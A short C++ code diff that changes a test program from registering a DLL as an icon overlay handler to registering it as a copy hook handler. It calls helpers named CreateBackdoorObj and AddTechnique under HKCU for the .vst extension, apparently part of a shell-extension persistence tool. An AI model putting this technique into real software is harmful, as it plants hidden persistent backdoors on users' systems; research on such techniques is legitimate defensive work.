@@ -5,9 +5,9 @@
 int wmain()
 {
 
-	std::wstring dllPath = L"C:\\Users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\ATLIconOverlayHandler.dll";
+	std::wstring dllPath = L"C:\\Users\\AliSAhmad\\source\\repos\\Test004\\x64\\Debug\\ATLCopyHookHandler.dll";
 	GUID guid = reg::CreateBackdoorObj(HKCU, dllPath);
 	std::wstring ext = L".vst";
-	reg::AddTechnique(ICON_OVERLAY, (WCHAR *)ext.c_str(), guid);
+	reg::AddTechnique(COPY_HOOK_HANDLER, (WCHAR *)ext.c_str(), guid);
 
 }
